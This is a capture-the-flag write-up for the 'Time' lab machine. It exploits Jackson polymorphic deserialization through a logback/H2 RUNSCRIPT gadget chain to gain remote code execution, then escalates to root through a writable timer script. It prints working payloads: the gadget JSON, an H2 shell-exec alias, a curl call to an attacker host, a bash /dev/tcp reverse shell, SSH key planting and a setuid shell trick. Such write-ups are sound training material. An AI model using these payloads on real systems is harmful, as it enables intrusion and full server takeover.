@@ -1,0 +1,145 @@
+Time
+
+24th March 2021 / Document No D21.100.112
+Prepared By: MrR3boot
+Machine Author(s): egotisticalSW & felamos
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+Time is a medium difficulty Linux machine that features an online JSON parser web application.
+This application is found to suffer from a Java Deserialization vulnerability, which is leveraged to
+gain a foothold on the box. Post-exploitation enumeration reveals that a system timer is
+executing a word-writable bash script. This is leveraged to gain a root shell on the server.
+
+Skills Required
+
+      Enumeration
+      Basic Java Knowledge
+      OWASP Top 10 Familiarity
+
+Skills Learned
+
+      Java Deserialization
+      System Timer Exploitation
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.214 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.214
+
+Nmap output reveals that the target server has ports 22 (OpenSSH) and 80 (Apache httpd) open.
+Let's browse to port 80.
+
+The web server is hosting an online JSON beautification and validation application. The dropdown
+menu contains the two options Beautify and Validate (beta!) . Let's input sample JSON data
+in the input field, select Beautify option and click on the PROCESS button.
+
+   {"title": "test"}
+This option beautifies the given JSON input. Let's send the same data and this time select the
+Validate (beta!) option.
+
+This returns the error message below.
+   Validation failed: Unhandled Java exception:
+   com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token
+   (START_OBJECT), expected START_ARRAY: need JSON Array to contain
+   As.WRAPPER_ARRAY type information for class java.lang.Object
+Foothold
+
+Jackson is a Java-based library that is used to serialize or map Plain Object Java Objects to JSON
+and vice versa. Searching online for the error expected START_ARRAY: need JSON Array to
+contain As.WRAPPER_ARRAY type information for class java.lang.Object returns the page
+below as the first result.
+
+The error is related to Jackson Polymorphic Deserialization. There are multiple CVEs for this
+specific implementation.
+
+      CVE-2019-14439
+      CVE-2019-12814
+      CVE-2019-12384 etc.
+In general, there are few requirements in order to exploit a Deserialization vulnerability.
+      The application should accept arbitrary input from the user.
+      The application should have at least one specific gadget class to exploit in the Java
+      classpath that is vulnerable.
+Although the target application satisfies the first requirement, there is no way to confirm the
+second requirement unless the source code is provided or is accessible by other means.
+Therefore we have to assume that the target application is using a vulnerable gadget in the class
+path.
+The H2 database engine is widely used by the Java community, and using RunScript feature it is
+possible to execute SQL scripts from a remote URL. The above CVEs mention that the Fasterxml
+jackson-databind package doesn't block the logback-core class, in which the vulnerability is
+introduced. If a logback class capable of initiating database connections is known (assuming the
+application is using the H2 database engine), then we should be able to execute the SQL queries
+on the target server.
+The DriverManagerConnectionSource class can be used to initialize the Java Database
+Connection (JDBC). JDBC is a Java API that is used to execute a query against a database. Let's
+stand up a Python HTTP server on port 80 and send the below input in order to validate the
+connection.
+
+   ["ch.qos.logback.core.db.DriverManagerConnectionSource",
+   {"url":"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://10.10.14.4/'"}]
+This is successful. Having confirmed the ability to execute SQL scripts against the H2 database,
+we can use the CREATE ALIAS H2 database feature to create a function that calls a Java code.
+This is explained here. Save the following contents as rce.sql in the same directory that the
+Python HTTP Server is running in.
+
+   CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws
+   java.io.IOException {
+
+          String[] command = {"bash", "-c", cmd};
+          java.util.Scanner s = new
+   java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimi
+   ter("\\A");
+          return s.hasNext() ? s.next() : ""; }
+   $$;
+   CALL SHELLEXEC('curl http://10.10.14.4/`id`')
+
+Now send the below payload to execute the commands.
+
+   ["ch.qos.logback.core.db.DriverManagerConnectionSource",
+   {"url":"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://10.10.14.4/rce.sql'"}]
+
+The web application is running as the pericles user. Let's modify the SQL payload in order to
+obtain a reverse shell.
+
+   CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws
+   java.io.IOException {
+
+          String[] command = {"bash", "-c", cmd};
+          java.util.Scanner s = new
+   java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimi
+   ter("\\A");
+          return s.hasNext() ? s.next() : ""; }
+   $$;
+   CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.4/4444 0>&1')
+
+Stand up a Netcat listener on port 4444 and then send the below payload.
+   ["ch.qos.logback.core.db.DriverManagerConnectionSource",
+   {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM
+   'http://10.10.14.4/rce.sql'"}]
+
+Let's add our SSH public key to the authorized_keys file on the server.
+   cd /home/pericles && mkdir .ssh
+   echo -n 'ssh-rsa AAAAB3NzaC1yc2E<SNIP>' > .ssh/authorized_keys
+
+We can now login via SSH as pericles and gain a stable shell.
+Privilege Escalation
+
+Having access to the server, we can enumerate the file system using the LinPEAS or LinEnum
+scripts.
+
+LinPEAS output reveals that a non-standard system timer is running every minute. It also
+highlights that pericles owns the file /usr/bin/timer_backup.sh . Let's see if the timer utilizes
+this file.
+
+This service executes another web_backup.service service. Let's check its contents.
+
+This service executes the script timer_backup.sh , which our current user has full permissions
+to. We can modify this script in order to obtain root access. Let's issue the command below,
+which copies /bin/sh to /tmp/sh and assigns the setuid bit to it.
+   echo 'cp /bin/sh /tmp/sh;chmod u+s /tmp/sh' > /usr/bin/timer_backup.sh
+After a minute we see that the file is created with root privileges and the setuid bit set.
+
+Running the sh binary with the -p option preserves the effective uid of the user, which gives us
+a root shell.
+
